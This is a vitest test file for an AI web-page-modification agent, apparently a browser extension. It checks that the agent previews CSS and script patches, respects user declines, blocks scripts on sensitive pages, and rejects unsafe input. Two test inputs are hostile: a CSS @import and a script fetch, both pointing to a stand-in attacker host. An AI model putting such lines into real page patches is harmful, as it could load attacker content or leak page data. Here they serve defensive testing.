import { describe, expect, it, vi } from 'vitest';
import {
  AlterAgent,
  type AgentEvent,
  type PageTools,
  type PreviewResult,
  type Proposal,
  type ProposalStatus,
  type ActionResult,
} from '../../src/agent/agent';
import type { VisualReport } from '../../src/content/visual-check';
import type { ScriptReport } from '../../src/lib/userscripts';
import type { ModelProvider, ModelSession, ToolSpec, TurnInput, TurnResult } from '../../src/agent/provider';
import type { PageSummary } from '../../src/lib/messages';
import { DARK_MODE_OFF, FOCUS_OFF, type Patch } from '../../src/lib/patches';

const report: ScriptReport = { errors: [], logs: [], matched: 0, added: 0, rates: null, watching: [], active: true, stoppedReason: null, outputs: null };

const summary: PageSummary = {
  url: 'https://example.com/',
  title: 'Example',
  lang: 'en',
  viewport: { width: 1200, height: 800 },
  documentHeight: 2000,
  declaredColorScheme: '',
  prefersDark: false,
  colors: {
    rootBackground: 'rgba(0, 0, 0, 0)',
    bodyBackground: 'rgb(255, 255, 255)',
    bodyText: 'rgb(0, 0, 0)',
    visibleBackground: 'rgb(255, 255, 255)',
    visibleBackgroundLuminance: 1,
  },
  rootVariables: [],
  landmarks: [],
  frameworkHints: [],
  elementCount: 100,
  passwordFieldInUse: false,
  pageData: null,
  focusAvailability: { article: null, recipe: null },
  alter: { savedPatchIds: [], previewActive: false, darkModeActive: false, paused: false, focus: { state: 'off' } },
};

function fakePage(
  saved: Patch[] = [],
  decision: 'approve' | 'decline' = 'approve',
  visual: (proposal: Proposal) => VisualReport | null = () => null,
): PageTools & { previews: Proposal[] } {
  const previews: Proposal[] = [];
  return {
    previews,
    summary: vi.fn(async () => summary),
    snapshot: vi.fn(async () => ({ text: '- main', truncated: false, matchedFocus: 0 })),
    query: vi.fn(async (selector: string) => ({ selector, count: 1, samples: [] })),
    styles: vi.fn(async (selector: string) => ({ selector, count: 0, elements: [] })),
    pageData: vi.fn(async () => ({ summary: { responses: 0, sources: [] }, matches: [], total: 0 })),
    preview: vi.fn(async (proposal: Proposal): Promise<PreviewResult> => {
      if (proposal.js && decision === 'decline') return { status: 'declined' };
      previews.push(proposal);
      const script = proposal.js
        ? { ...report, logs: ['ran'], matched: 1, watching: [{ selector: 'h1', matched: 1 }] }
        : null;
      const css = proposal.css ? { selectors: 1, matching: proposal.css.includes('.ghost') ? 0 : 1, unmatched: proposal.css.includes('.ghost') ? ['.ghost'] : [] } : null;
      return { status: 'applied', proposalId: `id-${previews.length}`, summary: { ...summary, alter: { ...summary.alter, previewActive: true } }, css, script, visual: visual(proposal) };
    }),
    savedPatches: vi.fn(async () => saved),
    proposalStatus: vi.fn((): ProposalStatus => 'previewing'),
    runAction: vi.fn(async (): Promise<ActionResult> => {
      if (decision === 'decline') return { status: 'declined' };
      return { status: 'ran', report: { ...report, outputs: { downloads: [{ filename: 'post.txt', text: 'hello', type: 'text/plain' }], clipboard: null } } };
    }),
  };
}

/** A provider that replays scripted turns and records what it was sent. */
function scripted(turns: (Omit<TurnResult, 'usage'> & { usage?: TurnResult['usage'] })[]): { provider: ModelProvider; inputs: TurnInput[] } {
  const inputs: TurnInput[] = [];
  const session: ModelSession = {
    send: async (input) => {
      inputs.push(input);
      const next = turns.shift();
      if (!next) throw new Error('script exhausted');
      return { usage: null, ...next };
    },
    export: () => ({ scripted: true }),
  };
  return { provider: { kind: 'test', model: 'test', createSession: (_: { system: string; tools: ToolSpec[] }) => session }, inputs };
}

const patchCall = (id: string, css: string, revises: string | null = null, js = '') => ({
  id,
  name: 'propose_patch',
  input: {
    title: 'Hide it',
    summary: 'Hid it.',
    css,
    js,
    revises,
    focus: { mode: 'off', theme: 'auto', text_size: 'normal' },
    dark_mode: { enabled: false, brightness: 100, contrast: 100, sepia: 0 },
  },
});

const savedPatch: Patch = {
  id: 'p1',
  hostname: 'example.com',
  title: 'Dark mode',
  summary: '',
  intent: 'make it dark',
  css: '.x { color: red }',
  darkMode: DARK_MODE_OFF,
  focus: FOCUS_OFF,
  js: '',
  enabled: true,
  model: 'test',
  createdAt: 0,
};

describe('AlterAgent', () => {
  it('previews a patch and returns it with the final reply', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '.ad { display: none !important; }')], stopReason: 'tool_use' },
      { text: 'Hid the ads.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    const events: AgentEvent[] = [];
    const reply = await new AlterAgent(provider, page).run('hide ads', { signal: new AbortController().signal, onEvent: (e) => events.push(e) });

    expect(reply.text).toBe('Hid the ads.');
    expect(reply.proposal?.css).toContain('.ad');
    expect(page.previews).toHaveLength(1);
    expect(events.some((e) => e.type === 'status')).toBe(true);
    // The first turn carries the page context, wrapped as untrusted data.
    const first = inputs[0]!;
    expect(first.kind === 'user' && first.text).toMatch(
      /^Scripts: allowed[^\n]*\n<page_data>[\s\S]*<\/page_data>\s*<saved_changes>[\s\S]*<\/saved_changes>\s*<request>hide ads<\/request>$/,
    );
  });

  it('rejects unsafe CSS without touching the page and lets the model retry', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '@import url(https://evil.example/x.css);')], stopReason: 'tool_use' },
      { text: '', toolCalls: [patchCall('2', 'body { font-size: 18px; }')], stopReason: 'tool_use' },
      { text: 'Done.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    const reply = await new AlterAgent(provider, page).run('bigger text', { signal: new AbortController().signal, onEvent: () => {} });

    const rejection = inputs[1]!;
    expect(rejection.kind === 'tool_results' && rejection.results[0]!.isError).toBe(true);
    expect(page.previews).toEqual([
      { title: 'Hide it', summary: 'Hid it.', css: 'body { font-size: 18px; }', js: '', darkMode: expect.anything(), focus: FOCUS_OFF, revises: null },
    ]);
    expect(reply.proposal?.css).toBe('body { font-size: 18px; }');
  });

  it('reports invalid tool input back to the model', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [{ id: '1', name: 'query_selector', input: { nope: true } }], stopReason: 'tool_use' },
      { text: 'Sorry.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    await new AlterAgent(provider, fakePage()).run('x', { signal: new AbortController().signal, onEvent: () => {} });
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]).toMatchObject({ isError: true });
  });

  it('rejects tools it does not have, including names every object has', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [{ id: '1', name: 'toString', input: {} }], stopReason: 'tool_use' },
      { text: 'Sorry.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    await new AlterAgent(provider, fakePage()).run('x', { signal: new AbortController().signal, onEvent: () => {} });
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]).toMatchObject({ isError: true, content: 'Unknown tool toString.' });
  });

  it('searches the data the site loaded and reports it in the model\'s terms', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [{ id: '1', name: 'find_page_data', input: { query: 'followers' } }], stopReason: 'tool_use' },
      { text: 'Found it.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    await new AlterAgent(provider, page).run('show follower counts', { signal: new AbortController().signal, onEvent: () => {} });
    expect(page.pageData).toHaveBeenCalledWith('followers');
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/^<page_data>\nNo data captured on this page yet\./);
  });

  it('only re-sends page context when the URL changes, and saved changes when they change', async () => {
    const { provider, inputs } = scripted([
      { text: 'One.', toolCalls: [], stopReason: 'end_turn' },
      { text: 'Two.', toolCalls: [], stopReason: 'end_turn' },
      { text: 'Three.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const saved: Patch[] = [];
    const agent = new AlterAgent(provider, fakePage(saved));
    await agent.run('first', { signal: new AbortController().signal, onEvent: () => {} });
    await agent.run('second', { signal: new AbortController().signal, onEvent: () => {} });
    saved.push(savedPatch);
    await agent.run('third', { signal: new AbortController().signal, onEvent: () => {} });

    const text = (i: number) => {
      const input = inputs[i]!;
      return input.kind === 'user' ? input.text : '';
    };
    expect(text(0)).toContain('<saved_changes>\nNone yet.');
    expect(text(1)).toBe('<request>second</request>');
    expect(text(2)).toMatch(/^<saved_changes>\nid: p1\ntitle: Dark mode \(on\)[\s\S]*<request>third<\/request>$/);
  });

  it('previews a revision of a saved change, and rejects unknown ids', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '.x { color: blue }', 'nope')], stopReason: 'tool_use' },
      { text: '', toolCalls: [patchCall('2', '.x { color: blue }', 'p1')], stopReason: 'tool_use' },
      { text: 'Updated.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage([savedPatch]);
    const reply = await new AlterAgent(provider, page).run('bluer', { signal: new AbortController().signal, onEvent: () => {} });
    const rejection = inputs[1]!;
    expect(rejection.kind === 'tool_results' && rejection.results[0]!.content).toMatch(/No saved change has id "nope"/);
    expect(page.preview).toHaveBeenCalledTimes(1);
    expect(page.preview).toHaveBeenCalledWith(expect.objectContaining({ css: '.x { color: blue }', revises: 'p1' }));
    expect(reply.proposal?.revises).toBe('p1');
  });

  it('handles refusals and runaway loops', async () => {
    const refusal = scripted([{ text: '', toolCalls: [], stopReason: 'refusal' }]);
    const reply = await new AlterAgent(refusal.provider, fakePage()).run('x', { signal: new AbortController().signal, onEvent: () => {} });
    expect(reply.text).toMatch(/declined/);

    const looping = scripted(
      Array.from({ length: 20 }, (_, i) => ({
        text: '',
        toolCalls: [{ id: String(i), name: 'query_selector', input: { selector: 'a' } }],
        stopReason: 'tool_use' as const,
      })),
    );
    await expect(new AlterAgent(looping.provider, fakePage()).run('x', { signal: new AbortController().signal, onEvent: () => {} })).rejects.toThrow(
      /too many steps/,
    );
  });

  it('runs approved scripts and reports what they did', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '', null, "alter.onElement('h1', (el) => el.remove());")], stopReason: 'tool_use' },
      { text: 'Removed it.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const reply = await new AlterAgent(provider, fakePage()).run('remove the title', { signal: new AbortController().signal, onEvent: () => {} });
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]!.content).toContain('"logs":["ran"]');
    expect(reply.proposal?.js).toContain('alter.onElement');
  });

  it('tells the model when the user declines a script', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '', null, 'alter.log(1);')], stopReason: 'tool_use' },
      { text: 'Okay.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage([], 'decline');
    const reply = await new AlterAgent(provider, page).run('x', { signal: new AbortController().signal, onEvent: () => {} });
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]).toMatchObject({ isError: false });
    expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/chose not to run/);
    expect(reply.proposal).toBeNull();
  });

  it('rejects unsafe scripts before asking the user', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '', null, "fetch('https://evil.example')")], stopReason: 'tool_use' },
      { text: 'Sorry.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    await new AlterAgent(provider, page).run('x', { signal: new AbortController().signal, onEvent: () => {} });
    expect(page.preview).not.toHaveBeenCalled();
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/Script rejected[\s\S]*fetch/);
  });

  it('refuses scripts on sensitive sites and pages with password fields', async () => {
    for (const page of [
      { ...fakePage(), summary: vi.fn(async () => ({ ...summary, url: 'https://www.paypal.com/myaccount' })) },
      { ...fakePage(), summary: vi.fn(async () => ({ ...summary, passwordFieldInUse: true })) },
    ]) {
      const { provider, inputs } = scripted([
        { text: '', toolCalls: [patchCall('1', '', null, 'alter.log(1);')], stopReason: 'tool_use' },
        { text: 'CSS only then.', toolCalls: [], stopReason: 'end_turn' },
      ]);
      await new AlterAgent(provider, page).run('x', { signal: new AbortController().signal, onEvent: () => {} });
      const first = inputs[0]!;
      expect(first.kind === 'user' && first.text).toMatch(/^Scripts: not allowed/);
      const result = inputs[1]!;
      expect(result.kind === 'tool_results' && result.results[0]).toMatchObject({ isError: true });
      expect(page.preview).not.toHaveBeenCalled();
    }
  });

  it('points out selectors that match nothing, so the model fixes them or says it could not verify', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', '.ghost { display: none }')], stopReason: 'tool_use' },
      { text: 'I could not verify this.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    await new AlterAgent(provider, fakePage()).run('hide the popup', { signal: new AbortController().signal, onEvent: () => {} });
    const result = inputs[1]!;
    expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/Nothing on the page matches: \.ghost/);
  });

  it('asks the model to fix visual problems twice per request, then to tell the user', async () => {
    const unreadable: VisualReport = {
      checked: 10,
      contrast: [{ selector: 'p.note', text: 'Hello', color: 'rgb(230, 230, 230)', background: 'rgb(255, 255, 255)', ratio: 1.2, required: 4.5, count: 3 }],
      contrastElements: 3,
      lost: [],
      lostElements: 0,
      leftBehind: [],
      horizontalOverflow: null,
      clipped: [],
      vanished: [],
    };
    const attempt = (id: string) => ({ text: '', toolCalls: [patchCall(id, 'body { background: white !important; }')], stopReason: 'tool_use' as const });
    const run = (agent: AlterAgent) => agent.run('light mode', { signal: new AbortController().signal, onEvent: () => {} });
    const { provider, inputs } = scripted([
      attempt('1'),
      attempt('2'),
      attempt('3'),
      { text: 'The notes are still faint.', toolCalls: [], stopReason: 'end_turn' },
      attempt('4'),
      { text: 'Done.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const agent = new AlterAgent(provider, fakePage([], 'approve', () => unreadable));
    await run(agent);
    const content = (i: number) => {
      const input = inputs[i]!;
      return input.kind === 'tool_results' ? input.results[0]!.content : '';
    };
    expect(content(1)).toContain('- 3 elements like p.note ("Hello"): rgb(230, 230, 230) on rgb(255, 255, 255) is 1.2:1, needs 4.5:1');
    expect(content(1)).toContain('Fix these with another propose_patch');
    expect(content(2)).toContain('Fix these with another propose_patch');
    expect(content(3)).toContain('You have already tried to fix these.');

    // A new request gets its own fix rounds.
    await run(agent);
    expect(content(5)).toContain('Fix these with another propose_patch');
  });

  it('tells the model when the user discarded or saved its last proposal, once', async () => {
    const { provider, inputs } = scripted([
      { text: '', toolCalls: [patchCall('1', 'body { background: #eef4ff; }')], stopReason: 'tool_use' },
      { text: 'Blue light mode is on.', toolCalls: [], stopReason: 'end_turn' },
      { text: 'Here is your copy button.', toolCalls: [], stopReason: 'end_turn' },
      { text: 'Okay.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    const agent = new AlterAgent(provider, page);
    await agent.run('blue themed light mode', { signal: new AbortController().signal, onEvent: () => {} });

    // The user clicks Discard in the panel, then asks for something unrelated.
    vi.mocked(page.proposalStatus).mockReturnValue('discarded');
    await agent.run('add a copy button', { signal: new AbortController().signal, onEvent: () => {} });
    const second = inputs[2]!;
    expect(second.kind === 'user' && second.text).toBe(
      '<preview_status>The user discarded your last proposal, "Hide it". It is no longer on the page. Leave it out unless they ask for it again.</preview_status>\n\n<request>add a copy button</request>',
    );

    // Reported once, not on every later turn.
    await agent.run('thanks', { signal: new AbortController().signal, onEvent: () => {} });
    const third = inputs[3]!;
    expect(third.kind === 'user' && third.text).toBe('<request>thanks</request>');
  });

  describe('one-time actions', () => {
    const actionCall = (js: string) => ({ id: 'a1', name: 'run_action', input: { title: 'Download post', summary: 'Saves it.', js } });

    it('runs approved actions and tells the model what was delivered', async () => {
      const { provider, inputs } = scripted([
        { text: '', toolCalls: [actionCall("alter.download('post.txt', alter.text(document.body))")], stopReason: 'tool_use' },
        { text: 'Downloaded.', toolCalls: [], stopReason: 'end_turn' },
      ]);
      const page = fakePage();
      const reply = await new AlterAgent(provider, page).run('download this post', { signal: new AbortController().signal, onEvent: () => {} });
      const result = inputs[1]!;
      expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/^The action ran\. Alter downloaded post\.txt \(5 characters\) for the user\./);
      // Actions are not changes: nothing to preview or save.
      expect(page.preview).not.toHaveBeenCalled();
      expect(reply.proposal).toBeNull();
    });

    it('reports declined actions without an error', async () => {
      const { provider, inputs } = scripted([
        { text: '', toolCalls: [actionCall("alter.copy('x')")], stopReason: 'tool_use' },
        { text: 'Okay.', toolCalls: [], stopReason: 'end_turn' },
      ]);
      await new AlterAgent(provider, fakePage([], 'decline')).run('copy it', { signal: new AbortController().signal, onEvent: () => {} });
      const result = inputs[1]!;
      expect(result.kind === 'tool_results' && result.results[0]).toMatchObject({ isError: false });
      expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/chose not to run this action/);
    });

    it('checks actions with the same rules as scripts', async () => {
      const { provider, inputs } = scripted([
        { text: '', toolCalls: [actionCall("document.querySelector('.more').click()")], stopReason: 'tool_use' },
        { text: 'Sorry.', toolCalls: [], stopReason: 'end_turn' },
      ]);
      const page = fakePage();
      await new AlterAgent(provider, page).run('load all comments and download them', { signal: new AbortController().signal, onEvent: () => {} });
      expect(page.runAction).not.toHaveBeenCalled();
      const result = inputs[1]!;
      expect(result.kind === 'tool_results' && result.results[0]!.content).toMatch(/Action rejected[\s\S]*click/);
    });
  });

  it('continues a conversation from exported state, as after reopening the panel', async () => {
    const first = scripted([
      { text: '', toolCalls: [patchCall('1', 'body { background: #eef4ff; }')], stopReason: 'tool_use' },
      { text: 'Blue it is.', toolCalls: [], stopReason: 'end_turn' },
    ]);
    const page = fakePage();
    const original = new AlterAgent(first.provider, page);
    await original.run('make it blue', { signal: new AbortController().signal, onEvent: () => {} });
    const state = JSON.parse(JSON.stringify(original.export()));

    // A new agent (new panel) picks up where the old one left off: it knows the page and the latest proposal.
    const second = scripted([{ text: 'Discarded it.', toolCalls: [], stopReason: 'end_turn' }]);
    vi.mocked(page.proposalStatus).mockReturnValue('discarded');
    const restored = new AlterAgent(second.provider, page, state);
    await restored.run('ok', { signal: new AbortController().signal, onEvent: () => {} });
    const input = second.inputs[0]!;
    expect(input.kind === 'user' && input.text).toMatch(/^<preview_status>The user discarded your last proposal, "Hide it"[\s\S]*<request>ok<\/request>$/);
    expect(page.proposalStatus).toHaveBeenCalledWith('id-1');
  });

  it('reports what each model call used, and can stop before a call', async () => {
    const usage = { model: 'claude-sonnet-5-5', inputTokens: 10, outputTokens: 5, cacheWriteTokens: 0, cacheReadTokens: 0 };
    const { provider, inputs } = scripted([{ text: 'Done.', toolCalls: [], stopReason: 'end_turn', usage }]);
    const events: AgentEvent[] = [];
    await new AlterAgent(provider, fakePage()).run('x', { signal: new AbortController().signal, onEvent: (e) => events.push(e) });
    expect(events).toContainEqual({ type: 'usage', usage });

    const blocked = scripted([{ text: 'never', toolCalls: [], stopReason: 'end_turn' }]);
    const run = new AlterAgent(blocked.provider, fakePage()).run('x', {
      signal: new AbortController().signal,
      onEvent: () => {},
      beforeTurn: () => {
        throw new Error('limit reached');
      },
    });
    await expect(run).rejects.toThrow('limit reached');
    expect(blocked.inputs).toHaveLength(0);
    expect(inputs).toHaveLength(1);
  });

  it('starts a new transcript, with the page again, when the provider or model changes', async () => {
    const first = scripted([{ text: 'One.', toolCalls: [], stopReason: 'end_turn' }]);
    const agent = new AlterAgent(first.provider, fakePage());
    await agent.run('first', { signal: new AbortController().signal, onEvent: () => {} });
    const state = agent.export();
    expect(state.sessionOwner).toBe('test:test');

    const created: unknown[] = [];
    const other = scripted([{ text: 'Two.', toolCalls: [], stopReason: 'end_turn' }]);
    const switched = { ...other.provider, kind: 'anthropic', model: 'claude-opus-5-5', createSession: (config: { system: string; tools: ToolSpec[] }, saved?: unknown) => {
      created.push(saved);
      return other.provider.createSession(config, saved);
    } };
    await new AlterAgent(switched, fakePage(), state).run('second', { signal: new AbortController().signal, onEvent: () => {} });
    expect(created).toEqual([undefined]);
    const sent = other.inputs[0]!;
    expect(sent.kind === 'user' && sent.text).toContain('Outline snapshot');
  });
});

